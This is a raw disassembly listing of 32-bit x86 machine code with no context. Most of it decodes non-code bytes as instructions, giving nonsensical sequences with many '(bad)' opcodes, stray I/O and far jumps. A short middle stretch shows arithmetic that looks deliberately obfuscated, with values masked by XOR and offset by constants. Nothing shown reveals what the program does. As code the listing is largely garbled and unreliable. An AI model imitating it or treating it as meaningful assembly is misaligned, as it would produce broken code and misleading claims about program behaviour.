  413264:	scas   al,BYTE PTR es:[edi]
  413265:	arpl   WORD PTR [eax-0x71442c95],sp
  41326b:	repnz mov cl,0xb
  41326e:	inc    esp
  41326f:	xchg   BYTE PTR [edx-0x42fa27b9],ch
  413275:	and    DWORD PTR [esi+0x4f58a0b9],edi
  41327b:	jne    0x413236
  41327d:	div    esi
  41327f:	push   edx
  413280:	hlt    
  413281:	jns    0x413224
  413283:	inc    sp
  413285:	mov    ds:0x45ef423b,al
  41328a:	std    
  41328b:	jecxz  0x41330b
  41328d:	pop    ds
  41328e:	shr    DWORD PTR ds:0xd005b6f2,0x8c
  413295:	xlat   BYTE PTR ds:[ebx]
  413296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413297:	dec    esp
  413298:	cdq    
  413299:	add    edx,ebx
  41329b:	jg     0x413265
  41329d:	adc    eax,0x3598abb8
  4132a2:	mov    ds:0x76325184,eax
  4132a7:	fsubrp st(6),st
  4132a9:	jnp    0x413262
  4132ab:	pushf  
  4132ac:	fcom   DWORD PTR [edx+0x2e]
  4132af:	cmp    al,0xd4
  4132b1:	sbb    ch,BYTE PTR [ebp-0x7228ac2c]
  4132b7:	std    
  4132b8:	cmp    al,0xa2
  4132ba:	inc    ecx
  4132bb:	popa   
  4132bc:	or     DWORD PTR [edx],ebx
  4132be:	lock es xchg edi,eax
  4132c1:	adc    DWORD PTR [ebx],0x4a8d368d
  4132c7:	(bad)  
  4132c8:	outs   dx,DWORD PTR ds:[esi]
  4132c9:	ret    0x713e
  4132cc:	ja     0x4132ff
  4132ce:	dec    esp
  4132cf:	cwde   
  4132d0:	jo     0x413337
  4132d2:	fst    DWORD PTR [esi-0x4a]
  4132d5:	mov    BYTE PTR [ebp+0x6364711c],al
  4132db:	mov    WORD PTR [ebx],cs
  4132dd:	ret    0x531d
  4132e0:	adc    BYTE PTR [ecx+eax*1],ah
  4132e3:	fimul  DWORD PTR ds:0xde3d5892
  4132e9:	nop
  4132ea:	rcl    BYTE PTR [edx],cl
  4132ec:	ret    0xa60d
  4132ef:	lods   eax,DWORD PTR ds:[esi]
  4132f0:	ret    0xf3a
  4132f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132f4:	jmp    0x2a4a565f
  4132f9:	cmp    BYTE PTR [ebx-0x780ed80b],bh
  4132ff:	or     DWORD PTR [edi+0x33],esi
  413302:	in     al,0xdc
  413304:	push   es
  413305:	clc    
  413306:	add    eax,0x705fe01f
  41330b:	pmaddwd mm6,QWORD PTR [ecx]
  41330e:	cs jp  0x41330c
  413311:	jmp    0x47f71af
  413316:	jmp    0x362f85a2
  41331b:	int3   
  41331c:	or     dl,BYTE PTR [ebx+0x4b]
  41331f:	jne    0x41336c
  413321:	jns    0x4132e5
  413323:	imul   eax,esi,0xe7a7fa4f
  413329:	(bad)  
  41332a:	pop    esp
  41332b:	(bad)  
  41332c:	repz cmp eax,0xcd2e3325
  413332:	js     0x4132c3
  413334:	xor    ebx,DWORD PTR [ebx-0x7e]
  413337:	xlat   BYTE PTR ds:[ebx]
  413338:	loope  0x4132d5
  41333a:	mov    dl,0x3c
  41333c:	nop
  41333d:	sub    al,0xd0
  41333f:	sar    DWORD PTR [ebx-0x1fa40d68],1
  413345:	std    
  413346:	xchg   DWORD PTR ds:0xd13a3602,ebx
  41334c:	push   eax
  41334d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41334e:	(bad)  
  413350:	das    
  413351:	loope  0x4133ca
  413353:	arpl   WORD PTR [edi-0x45],bp
  413356:	sbb    DWORD PTR [ecx+0x2254e926],esp
  41335c:	mov    ebp,0xc03afdc8
  413361:	sub    DWORD PTR [edx],edx
  413363:	push   eax
  413364:	je     0x4132f4
  413366:	out    0x83,eax
  413368:	push   edx
  413369:	adc    DWORD PTR [esi+0x64911a05],esi
  41336f:	mov    ebx,0x3498537d
  413374:	dec    ecx
  413375:	fs xchg esp,eax
  413377:	jmp    0x413316
  413379:	out    dx,al
  41337a:	mov    eax,ds:0x81ad25fc
  41337f:	call   0xd315:0x14b79dc
  413386:	push   eax
  413387:	shl    BYTE PTR [esi-0x67a0f0c1],0x37
  41338e:	call   0x8ff1:0xa2daade2
  413395:	test   eax,0x1dc29a4e
  41339a:	push   edx
  41339b:	sbb    ebx,ebx
  41339d:	mov    ?,WORD PTR [edx]
  41339f:	aas    
  4133a0:	xor    al,0xfa
  4133a2:	jmp    0x4133db
  4133a4:	pop    ecx
  4133a5:	(bad)  
  4133a6:	sbb    eax,0x3dd1b94f
  4133ab:	lods   al,BYTE PTR ds:[esi]
  4133ac:	add    DWORD PTR [esi+0x60c3b8e6],edi
  4133b2:	bound  edx,QWORD PTR [edi+ecx*1]
  4133b5:	push   edi
  4133b6:	or     eax,0xa6dfec06
  4133bb:	pop    esi
  4133bc:	inc    ecx
  4133bd:	sti    
  4133be:	mov    esp,0x275c6c8f
  4133c3:	xor    al,BYTE PTR [ebp+ecx*4+0x7e]
  4133c7:	int    0x39
  4133c9:	jle    0x41339d
  4133cb:	fs mov ecx,0x75a91b73
  4133d1:	(bad)  
  4133d2:	mov    eax,0xfc27472a
  4133d7:	pop    es
  4133d8:	mul    DWORD PTR [ecx-0x374c8fbe]
  4133de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133df:	sub    cl,BYTE PTR [ebx+0x53048a18]
  4133e5:	push   edx
  4133e6:	aaa    
  4133e7:	push   edi
  4133e8:	mov    al,ds:0x1e9928cf
  4133ed:	lods   al,BYTE PTR ds:[esi]
  4133ee:	or     BYTE PTR [ecx],bh
  4133f0:	aam    0x61
  4133f2:	pop    eax
  4133f3:	js     0x41343a
  4133f5:	mov    esi,0x4b862f2d
  4133fa:	sub    eax,0x4a3d111f
  4133ff:	sbb    eax,0x9b96a082
  413404:	div    BYTE PTR [esi+0xa]
  413407:	push   ebp
  413408:	xor    ebp,DWORD PTR [ecx]
  41340a:	cmp    eax,0xbed3013e
  41340f:	push   ss
  413410:	aam    0x73
  413412:	aas    
  413413:	and    eax,DWORD PTR [ecx]
  413415:	adc    BYTE PTR ds:0xfbc16bb5,bh
  41341b:	outs   dx,DWORD PTR ds:[esi]
  41341c:	cmp    al,0x92
  41341e:	xchg   ecx,eax
  41341f:	sbb    BYTE PTR [esp+eiz*4+0x16c22676],0x37
  413427:	pop    eax
  413429:	mov    ecx,es
  41342b:	ret    0xe67a
  41342e:	call   0x91f2ade7
  413433:	aas    
  413434:	gs stc 
  413436:	sbb    ch,bl
  413438:	hlt    
  413439:	outs   dx,BYTE PTR ds:[esi]
  41343a:	inc    edi
  41343b:	fs clc 
  41343d:	sub    al,ah
  41343f:	mov    eax,ds:0x1ae0ec3a
  413444:	aam    0x98
  413446:	in     al,0x96
  413448:	jle    0x413412
  41344a:	jmp    0xff1eb4c2
  41344f:	(bad)  
  413450:	fld    QWORD PTR ds:0x7dfd285c
  413456:	jl     0x4133f6
  413458:	fld    QWORD PTR [edx]
  41345a:	mov    esp,0x5e472c3c
  41345f:	jns    0x41340f
  413461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413462:	add    eax,eax
  413464:	mov    al,0xb7
  413466:	add    esp,ebx
  413468:	aaa    
  413469:	or     eax,0x94f25f78
  41346e:	push   esi
  41346f:	(bad)  
  413471:	ja     0x4134e9
  413473:	adc    eax,0x5e3bfa42
  413478:	adc    eax,0x6cdefbc4
  41347d:	sbb    eax,0x16f05a11
  413482:	aam    0xf7
  413484:	scas   al,BYTE PTR es:[edi]
  413485:	shl    DWORD PTR ds:0xa6a51d8c,0x50
  41348c:	push   ecx
  41348d:	jmp    FWORD PTR [eax+0x6eed1e5]
  413493:	imul   edx,DWORD PTR [ecx-0x35db83ac],0xa2a148f4
  41349d:	fldenv [esi-0x30]
  4134a0:	sar    BYTE PTR [ebx],0xe4
  4134a3:	push   esi
  4134a4:	push   ds
  4134a5:	mov    ecx,0xdc87fd18
  4134aa:	pop    ebx
  4134ab:	or     BYTE PTR [ebp-0x7f],bl
  4134ae:	add    edi,DWORD PTR [ebx+ebx*1+0x5d85ce73]
  4134b5:	or     edx,DWORD PTR [ebx+0x18]
  4134b8:	daa    
  4134b9:	add    ebp,DWORD PTR [ebp+esi*8+0x69]
  4134bd:	outs   dx,BYTE PTR ds:[esi]
  4134be:	sub    cl,BYTE PTR [ebx-0x3a]
  4134c1:	fild   QWORD PTR [edx]
  4134c3:	sbb    al,0x3b
  4134c5:	das    
  4134c6:	mov    cl,0x14
  4134c8:	dec    ecx
  4134c9:	cli    
  4134ca:	pop    ebx
  4134cb:	jmp    0x4134db
  4134cd:	sub    bl,BYTE PTR [esp+ebx*4-0x71]
  4134d1:	ss out 0xfc,al
  4134d4:	outs   dx,BYTE PTR ds:[esi]
  4134d5:	mov    al,0x7a
  4134d7:	in     eax,dx
  4134d8:	jbe    0x413550
  4134da:	push   esi
  4134db:	mov    al,0x2a
  4134dd:	adc    DWORD PTR [edi+0x78c2b821],0x22ad77f5
  4134e7:	stc    
  4134e8:	push   ecx
  4134e9:	and    BYTE PTR [edi-0x6e],bh
  4134ec:	(bad)
  4134f0:	iret   
  4134f1:	xchg   esp,eax
  4134f2:	rcl    BYTE PTR [esi],1
  4134f4:	push   DWORD PTR ds:0xcfcc3a9
  4134fa:	adc    al,0x12
  4134fc:	and    DWORD PTR [eax+eiz*4+0x4d],esp
  413500:	(bad)  
  413502:	out    dx,al
  413503:	cs xor al,0x36
  413506:	outs   dx,BYTE PTR ds:[esi]
  413507:	dec    edi
  413508:	test   DWORD PTR [ebp+0x74aa1d05],ebp
  41350e:	lds    edx,FWORD PTR [eax+0x4b]
  413511:	inc    esp
  413512:	sti    
  413513:	sub    bh,ch
  413515:	inc    esp
  413516:	mov    al,dh
  413518:	and    bl,ch
  41351a:	fiadd  WORD PTR [esi-0x31f7f5c2]
  413520:	rol    ebp,1
  413522:	cs ss adc esp,eax
  413526:	jle    0x413559
  413528:	mov    ebp,0x8dacdbea
  41352d:	jge    0x4134ba
  41352f:	loope  0x4134bc
  413531:	jnp    0x413585
  413533:	xor    dh,BYTE PTR [edi+0x3b12f5b1]
  413539:	jo     0x413502
  41353b:	add    ebx,edx
  41353d:	adc    ebx,DWORD PTR [esi-0x67]
  413540:	imul   edx,DWORD PTR [eax+0x62],0x148281ac
  413547:	mov    ebp,0xe59c415c
  41354c:	mov    ecx,0x4903f2ac
  413551:	push   DWORD PTR [esi+0x4be733aa]
  413557:	add    ah,BYTE PTR [edx]
  413559:	xchg   BYTE PTR [ebp+0x5ef108dc],ch
  41355f:	mov    ah,0xe4
  413561:	jnp    0x413536
  413563:	mov    eax,ds:0xa2c7ec15
  413568:	or     al,0xc3
  41356a:	mov    ds:0x92a34685,eax
  41356f:	jnp    0x41354b
  413571:	aad    0x30
  413573:	mov    ebp,0x554cedef
  413578:	add    cl,BYTE PTR [ecx+0x5c72dec6]
  41357e:	add    DWORD PTR [esi+0x7f8da789],edx
  413584:	dec    ebp
  413585:	repnz cmc 
  413587:	fist   WORD PTR [ebx-0x1c]
  41358a:	aaa    
  41358b:	mov    ah,0x48
  41358d:	imul   ebx,DWORD PTR [ecx],0xff79088a
  413593:	call   FWORD PTR [ebx]
  413595:	shr    BYTE PTR [ebx],0xf8
  413598:	(bad)  
  413599:	xor    al,0x89
  41359b:	jecxz  0x413566
  41359d:	jp     0x4135af
  41359f:	cpuid  
  4135a1:	mov    ecx,0x1e80d90b
  4135a6:	(bad)  
  4135a7:	cld    
  4135a8:	in     eax,0x7d
  4135aa:	cmp    BYTE PTR [edi+0x89f41f2],0x52
  4135b1:	mov    al,0xdb
  4135b3:	ret    0x38e2
  4135b6:	test   BYTE PTR [ebx],dh
  4135b8:	daa    
  4135b9:	jp     0x413634
  4135bb:	sbb    DWORD PTR [edx+0x3c3ee56a],edi
  4135c1:	xchg   ebx,eax
  4135c2:	js     0x4135e6
  4135c4:	add    ebp,DWORD PTR [eax+0x36]
  4135c7:	or     bh,cl
  4135c9:	jnp    0x41358d
  4135cb:	adc    BYTE PTR [eax-0x201e13a1],bl
  4135d1:	xor    eax,0xce9dc85c
  4135d6:	adc    eax,0xa7441d0a
  4135db:	pop    ecx
  4135dc:	inc    edi
  4135dd:	ins    DWORD PTR es:[edi],dx
  4135de:	cmp    al,0x67
  4135e0:	pop    ecx
  4135e1:	mov    bl,0x99
  4135e3:	or     al,0xe5
  4135e5:	scas   eax,DWORD PTR es:[edi]
  4135e6:	push   cs
  4135e7:	ret    
  4135e8:	mov    cl,BYTE PTR [edx]
  4135ea:	lds    ebx,FWORD PTR [eax-0x3af1694e]
  4135f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135f1:	je     0x413658
  4135f3:	cmp    cl,BYTE PTR [ebp+ebx*4-0x2ec9ca32]
  4135fa:	daa    
  4135fb:	pusha  
  4135fc:	loope  0x41363b
  4135fe:	add    eax,0x7bf6f082
  413603:	pop    ebx
  413604:	jl     0x413634
  413606:	pop    ebp
  413607:	outs   dx,DWORD PTR ds:[esi]
  413608:	call   0xc1bb:0x94d7a0cb
  41360f:	push   edx
  413610:	dec    esi
  413611:	push   cs
  413612:	xor    eax,0xf2da3398
  413617:	push   0xe880e131
  41361c:	xchg   BYTE PTR [ecx+eax*8-0x2f],bl
  413620:	and    edi,DWORD PTR [edi+0x47]
  413623:	hlt    
  413624:	sub    ecx,DWORD PTR [edx+0x71]
  413627:	int3   
  413628:	cmp    BYTE PTR fs:[ecx],cl
  41362b:	push   cs
  41362c:	retf   
  41362d:	jecxz  0x41360f
  41362f:	sub    bl,dh
  413631:	mov    bl,0xfe
  413633:	xchg   ebp,eax
  413634:	xor    DWORD PTR [ebx+edi*2],eax
  413637:	mov    edx,0xbf4117e2
  41363c:	pop    ecx
  41363d:	sub    DWORD PTR [ecx+eiz*2+0x59],eax
  413641:	sub    esp,DWORD PTR [edi]
  413643:	cmc    
  413644:	and    edx,ecx
  413646:	or     eax,edx
  413648:	and    ch,bl
  41364a:	lea    esi,[esi]
  41364c:	dec    esi
  41364d:	test   DWORD PTR [edx-0x14],edi
  413650:	cmp    eax,0x1da6850c
  413655:	idiv   DWORD PTR [edx]
  413657:	pop    edi
  413658:	test   eax,0xf287149e
  41365d:	and    DWORD PTR [eax],edi
  41365f:	into   
  413660:	lahf   
  413661:	xor    DWORD PTR [eax],esp
  413663:	call   0xb6b8:0x7b8927a1
  41366a:	xchg   BYTE PTR [eax],bh
  41366c:	jge    0x413690
  41366e:	cmp    DWORD PTR [ecx+0x4900d6a5],edi
  413674:	(bad)  
  413675:	sbb    ah,BYTE PTR [ebp+edx*4-0x40]
  413679:	faddp  st(0),st
  41367b:	nop
  41367c:	pop    eax
  41367d:	aaa    
  41367e:	js     0x4136f4
  413680:	add    eax,0x57e5c458
  413685:	ja     0x4136b7
  413687:	call   DWORD PTR [edx]
  413689:	add    BYTE PTR [bx],ch
  41368c:	adc    bh,BYTE PTR [edx]
  41368e:	mov    DWORD PTR [edi+esi*8+0x45],0x2bb6e5ed
  413696:	sbb    eax,0x66077e38
  41369b:	cmp    BYTE PTR [esi-0x5e],dh
  41369e:	in     al,0x11
  4136a0:	mov    edi,0x93dbf936
  4136a5:	push   0xa1120113
  4136aa:	xchg   esp,eax
  4136ab:	adc    bh,BYTE PTR [esi]
  4136ad:	(bad)  
  4136af:	sub    ebx,eax
  4136b1:	scas   eax,DWORD PTR es:[edi]
  4136b2:	adc    ah,BYTE PTR [edi-0x1d8a789e]
  4136b8:	in     al,0x7c
  4136ba:	sbb    ebx,esp
  4136bc:	inc    ebp
  4136bd:	int    0x6c
  4136bf:	pop    edi
  4136c0:	mov    ebx,DWORD PTR [ebp-0xc]
  4136c3:	xor    edx,esi
  4136c5:	add    edx,edi
  4136c7:	imul   edx,ebx
  4136ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4136cd:	mov    BYTE PTR [edx+ebx*1],al
  4136d0:	mov    eax,DWORD PTR [ebp-0x30]
  4136d3:	mov    edx,DWORD PTR [ebp-0x3c]
  4136d6:	xor    eax,esi
  4136d8:	xor    edx,esi
  4136da:	add    eax,edi
  4136dc:	add    edx,edi
  4136de:	imul   eax,edx
  4136e1:	add    eax,DWORD PTR [ebp-0xc]
  4136e4:	mov    DWORD PTR [ebp-0xc],eax
  4136e7:	mov    eax,DWORD PTR [ebp-0xc]
  4136ea:	mov    edx,DWORD PTR [ebp-0x24]
  4136ed:	cmp    edx,eax
  4136ef:	jb     0x411257
  4136f5:	mov    eax,DWORD PTR [ebp-0x3c]
  4136f8:	mov    edx,DWORD PTR [ebp-0x24]
  4136fb:	xor    eax,esi
  4136fd:	add    eax,edi
  4136ff:	imul   eax,edx
  413702:	mov    edx,DWORD PTR [ebp-0x20]
  413705:	xor    edx,esi
  413707:	add    edx,edi
  413709:	or     eax,edx
  41370b:	mov    edx,DWORD PTR [ebp-0x18]
  41370e:	xor    edx,esi
  413710:	add    eax,edx
  413712:	mov    edx,DWORD PTR [ebp-0x18]
  413715:	xor    edx,esi
  413717:	add    eax,edx
  413719:	mov    edx,DWORD PTR [ebp-0x10]
  41371c:	lea    eax,[eax+edx*1+0x64e5b6]
  413723:	jmp    0x413737
  413728:	mov    eax,DWORD PTR [ebp-0x18]
  41372b:	mov    edx,DWORD PTR [ebp-0x10]
  41372e:	xor    eax,esi
  413730:	lea    eax,[eax+edx*1+0x3272db]
  413737:	mov    DWORD PTR [ebp-0x10],eax
  41373a:	jmp    0x4111a4
  41373f:	mov    eax,DWORD PTR [ebp-0x38]
  413742:	mov    edx,DWORD PTR [ebp+0xc]
  413745:	xor    edx,esi
  413747:	lea    ecx,[ecx+edx*1+0x3272db]
  41374e:	lea    edx,[ecx-0x3272db]
  413754:	xor    edx,esi
  413756:	cmp    edx,0xf89c95b6
  41375c:	jne    0x410fde
  413762:	mov    ecx,DWORD PTR [ebp+0x8]
  413765:	mov    edx,DWORD PTR [ebp+0xc]
  413768:	mov    ebx,DWORD PTR [ebp+0x8]
  41376b:	xor    edx,esi
  41376d:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  413774:	xor    ecx,esi
  413776:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41377d:	xor    ebx,esi
  41377f:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  413786:	jmp    0x415b38
  41378b:	xlat   BYTE PTR ds:[ebx]
  41378c:	repz mov bh,0xb2
  41378f:	xchg   ebx,eax
  413790:	mov    fs,WORD PTR [edi+0xef9e63]
  413796:	mov    bl,0xf4
  413798:	inc    eax
  413799:	mov    WORD PTR [edi-0x5e],es
  41379c:	imul   esp,DWORD PTR [edx+0x62],0xffffffcd
  4137a0:	pop    edi
  4137a1:	bound  esp,QWORD PTR [edx+0xc]
  4137a4:	fmul   st,st(4)
  4137a6:	call   0x86e6853a
  4137ab:	loope  0x413788
  4137ad:	push   0xffffff93
  4137af:	(bad)
  4137b3:	in     al,0x47
  4137b5:	pop    es
  4137b6:	xlat   BYTE PTR ds:[ebx]
  4137b7:	pushf  
  4137b8:	enter  0x62e5,0xef
  4137bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137bd:	xchg   esi,eax
  4137be:	and    eax,0xce58f1bf
  4137c3:	add    ah,BYTE PTR [esi+0x4d]
  4137c6:	je     0x413756
  4137c8:	cli    
  4137c9:	dec    esp
  4137ca:	repnz rcr DWORD PTR [edx+0x4a192bcb],1
  4137d1:	and    al,0x60
  4137d3:	xor    esi,edx
  4137d5:	push   cs
  4137d6:	and    ah,BYTE PTR [ebx+0x66c5f3e7]
  4137dc:	andps  xmm4,XMMWORD PTR [edi+edx*1+0x55]
  4137e1:	lods   al,BYTE PTR ds:[esi]
  4137e2:	mov    WORD PTR [ebp+0x205ca8a],gs
  4137e8:	inc    ebp
  4137e9:	ror    BYTE PTR [ebp+0x62a924fc],cl
  4137ef:	loopne 0x4137fd
  4137f1:	mov    edi,0xf49a4e71
  4137f6:	jns    0x413868
  4137f8:	in     al,0x69
  4137fa:	hlt    
  4137fb:	aad    0x99
  4137fd:	mov    bh,BYTE PTR [eax+edx*8]
  413800:	mov    ebp,0x7d9396db
  413805:	into   
  413806:	pop    ds
  413807:	sbb    DWORD PTR [eax],esi
  413809:	scas   eax,DWORD PTR es:[edi]
  41380a:	gs inc ebx
  41380c:	sbb    eax,0x583c716b
  413811:	aas    
  413812:	lahf   
  413813:	imul   edi,DWORD PTR [ecx-0x6bfb1ca3],0x3c
  41381a:	clc    
  41381b:	int    0xbf
  41381d:	pop    ds
  41381e:	cmp    al,0x2c
  413820:	(bad)  
  413821:	aam    0x85
  413823:	push   edx
  413824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413825:	dec    eax
  413826:	inc    ebx
  413827:	push   ebp
  413828:	inc    eax
  413829:	out    0x9e,al
  41382b:	mov    edi,eax
  41382d:	add    ch,al
  41382f:	adc    bh,BYTE PTR [edx-0x19]
  413832:	(bad)  
  413833:	dec    ebx
  413834:	dec    ebx
  413835:	fdiv   DWORD PTR [esi]
  413837:	(bad)
  41383a:	jbe    0x4138b4
  41383c:	pusha  
  41383d:	ret    0x2eca
  413840:	mov    WORD PTR [edx-0x25db7fc5],?
  413846:	mov    ebp,0xd25f3558
  41384b:	pop    ss
  41384c:	pop    eax
  41384d:	sub    ebx,DWORD PTR [eax-0x69ee6cc5]
  413853:	add    esi,DWORD PTR [ebp-0x6e64108e]
  413859:	ins    BYTE PTR es:[edi],dx
  41385a:	(bad)  
  41385b:	popf   
  41385c:	xchg   ebx,eax
  41385d:	xchg   ebx,eax
  41385e:	call   0x45f009d0
  413863:	jne    0x4138ac
  413865:	jno    0x4137ef
  413867:	cmp    eax,0xab59d5b5
  41386c:	mul    BYTE PTR [ecx-0x47ea8bbe]
  413872:	iret   
  413873:	dec    ebx
  413874:	xor    BYTE PTR [esi+0x51],bl
  413877:	mov    ch,BYTE PTR [eax+esi*1-0x56]
  41387b:	repz mov ah,0x6f
  41387e:	repnz test BYTE PTR [esp+edx*1],bh
  413882:	fdiv   DWORD PTR [ecx-0x12]
  413885:	into   
  413886:	cs jge 0x4138ac
  413889:	push   0xf1a9881a
  41388e:	mov    WORD PTR [edx-0x53],fs
  413891:	push   eax
  413892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413893:	enter  0x779c,0x6b
  413897:	inc    edi
  413898:	daa    
  413899:	repnz xor al,0xe5
  41389c:	xchg   ebx,eax
  41389d:	pop    es
  41389e:	int    0xcf
  4138a0:	test   DWORD PTR [eax],ebp
  4138a2:	out    0xb8,al
  4138a4:	(bad)  
  4138a5:	sub    esi,DWORD PTR [edi+0x3e]
  4138a8:	sub    DWORD PTR [ebp-0x4b49f9a2],ecx
  4138ae:	dec    ebx
  4138af:	repnz aas 
  4138b1:	sub    BYTE PTR [ebp+0x511f543a],ch
  4138b7:	retf   0x4fd6
  4138ba:	scas   al,BYTE PTR es:[edi]
  4138bb:	push   ds
  4138bc:	aaa    
  4138bd:	dec    esp
  4138be:	dec    ebx
  4138bf:	fwait
  4138c0:	je     0x4138bf
  4138c2:	push   ecx
  4138c3:	loope  0x4138f7
  4138c5:	xor    dh,BYTE PTR [ebx-0xc]
  4138c8:	loop   0x41391c
  4138ca:	cmp    eax,0x8034952
  4138cf:	xchg   ecx,eax
  4138d0:	shl    DWORD PTR [esi-0x3f48c41a],cl
  4138d6:	dec    ecx
  4138d7:	bound  ecx,QWORD PTR [esi]
  4138d9:	jmp    0xe294:0x615aa7f7
  4138e0:	(bad)  
  4138e1:	mov    ebp,ecx
  4138e3:	int3   
  4138e4:	or     DWORD PTR [ebp+0x2c],edx
  4138e7:	sub    BYTE PTR [ebx],ch
  4138e9:	cmp    DWORD PTR es:[esi],ebp
  4138ec:	ja     0x4138ee
  4138ee:	call   0x7128:0x7ea18144
  4138f5:	ja     0x4138bf
  4138f7:	pop    esp
  4138f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138f9:	dec    edi
  4138fa:	clc    
  4138fb:	sbb    al,0xcf
  4138fd:	xor    bl,ch
  4138ff:	cmc    
  413900:	push   es
  413901:	push   eax
  413902:	js     0x41393b
  413904:	mov    bl,0x42
  413906:	sub    bl,BYTE PTR [ebx]
  413908:	pop    ebx
  413909:	(bad)  
  41390c:	jno    0x4138d4
  41390e:	pop    edi
  41390f:	daa    
  413910:	jae    0x4138bb
  413912:	inc    ebp
  413913:	jge    0x4138c1
  413915:	push   ecx
  413916:	add    eax,0x160cc027
  41391b:	int    0xda
  41391d:	sub    ecx,DWORD PTR [ecx+0x77257143]
  413923:	sbb    ebx,DWORD PTR [si-0x1e91]
  413928:	inc    ebx
  413929:	push   ecx
  41392a:	stc    
  41392b:	adc    BYTE PTR [ecx+0x7f],ch
  41392e:	and    al,0x88
  413930:	add    DWORD PTR [ebp-0x22],edi
  413933:	adc    eax,0x8cc5001b
  413938:	mov    bh,0xa
  41393a:	loop   0x4138d1
  41393c:	js     0x413994
  41393e:	lahf   
  41393f:	test   eax,0x48364c12
  413944:	adc    BYTE PTR [ebp+0x3c],dh
  413947:	mov    dh,0x9f
  413949:	adc    BYTE PTR [eax],al
  41394b:	aad    0xa1
  41394d:	repz test al,0x22
  413950:	and    bh,BYTE PTR [ebx+0x2b]
  413953:	push   esi
  413954:	adc    bl,BYTE PTR [ebp+0x605b651f]
  41395a:	sub    eax,0x512df678
  41395f:	or     edi,DWORD PTR [esi+0x7db17939]
  413965:	xlat   BYTE PTR es:[ebx]
  413967:	shl    DWORD PTR ds:0x2018d170,1
  41396d:	mov    ebp,DWORD PTR [ecx+0x348ff881]
  413973:	ja     0x4139d9
  413975:	retf   0x60ac
  413978:	lods   al,BYTE PTR ds:[esi]
  413979:	jne    0x413904
  41397b:	cmp    eax,DWORD PTR [esi+edi*4+0x461024b1]
  413982:	inc    ebp
  413983:	enter  0xdc8d,0xb1
  413987:	popa   
  413988:	loopne 0x413930
  41398a:	mov    edi,0x2930d406
  41398f:	xchg   esi,eax
  413990:	mov    bl,0x11
  413992:	ficomp WORD PTR [ebp+0x1c77d003]
  413998:	aam    0x22
  41399a:	out    dx,eax
  41399b:	icebp  
  41399c:	jnp    0x41393f
  41399e:	jp     0x4139b9
  4139a0:	sub    ah,BYTE PTR [ebp+0x61c8963c]
  4139a6:	mov    DWORD PTR [ebp+0x27],esi
  4139a9:	aas    
  4139aa:	mov    eax,ds:0xd35b457
  4139af:	idiv   ecx
  4139b1:	cli    
  4139b2:	mov    esp,0xd910ddee
  4139b7:	call   0x9cc5:0x953037d4
  4139be:	int    0xec
  4139c0:	les    edi,FWORD PTR [ebx]
  4139c2:	or     DWORD PTR [edx+0x5a],ecx
  4139c5:	aam    0x66
  4139c7:	adc    DWORD PTR [edx],edi
  4139c9:	add    ebx,esp
  4139cb:	loopne 0x413979
  4139cd:	lods   al,BYTE PTR ds:[esi]
  4139ce:	mov    al,0x50
  4139d0:	fcomp  st(3)
  4139d2:	mov    ch,0x7b
  4139d4:	lods   al,BYTE PTR ds:[esi]
  4139d5:	retf   
  4139d6:	std    
  4139d7:	pop    eax
  4139d8:	cmc    
  4139d9:	mov    ecx,0x8785f929
  4139de:	out    0x4f,eax
  4139e0:	mov    ch,bl
  4139e2:	clc    
  4139e3:	out    0x1a,al
  4139e5:	xchg   edx,ebp
  4139e7:	dec    ebx
  4139e8:	push   eax
  4139e9:	sub    dl,BYTE PTR [esi+edi*1]
  4139ec:	xor    eax,DWORD PTR [ecx+eiz*4]
  4139ef:	aam    0xed
  4139f1:	data16 mov bh,0xea
  4139f4:	jecxz  0x413a6b
  4139f6:	pop    es
  4139f7:	int3   
  4139f8:	xchg   ecx,eax
  4139f9:	push   edi
  4139fa:	repnz add DWORD PTR [edx],eax
  4139fd:	loope  0x4139c5
  4139ff:	mov    ch,0x51
  413a01:	js     0x4139e4
  413a03:	add    dh,0xed
  413a06:	daa    
  413a07:	dec    ecx
  413a08:	in     al,dx
  413a09:	mov    dh,0xd7
  413a0b:	jp     0x413a5b
  413a0d:	xor    al,0xc6
  413a0f:	mov    dl,dh
  413a11:	(bad)  [ebp-0x35]
  413a14:	fstp   TBYTE PTR [edx+0x51897f60]
  413a1a:	fnstenv [ecx]
  413a1c:	test   DWORD PTR [esi+0x6],0x2c4f4c2f
  413a23:	cmp    eax,0xd3437638
  413a28:	fadd   QWORD PTR [esi+0x3df90325]
  413a2e:	add    eax,0x47b28c7
  413a33:	mov    cl,BYTE PTR [edx]
  413a35:	jb     0x413a8f
  413a37:	mov    ?,WORD PTR [edx-0x3ffad340]
  413a3d:	pop    ecx
  413a3e:	scas   eax,DWORD PTR es:[edi]
  413a3f:	inc    ebp
  413a40:	and    eax,0x6c462e7
  413a45:	push   cs
  413a46:	mov    eax,0xbc4e487b
  413a4b:	lea    ebx,[edi+eiz*2]
  413a4e:	js     0x413a95
  413a50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a51:	add    eax,0xe90c138
  413a56:	lds    ebp,FWORD PTR [ebp-0x73116b5a]
  413a5c:	xor    ah,BYTE PTR [edi]
  413a5e:	push   eax
  413a5f:	fcmovnbe st,st(1)
  413a61:	fisub  WORD PTR [edx-0x125ee4b8]
  413a67:	pushf  
  413a68:	dec    edi
  413a69:	xchg   edx,eax
  413a6a:	sbb    BYTE PTR [esi-0x54],al
  413a6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a6e:	mov    edx,0x4057f666
  413a73:	push   edi
  413a74:	jecxz  0x413a4d
  413a76:	retf   0x9dc1
  413a79:	mov    ah,0x25
  413a7b:	push   ebp
  413a7c:	dec    ecx
  413a7d:	loope  0x413aa9
  413a7f:	adc    al,0xef
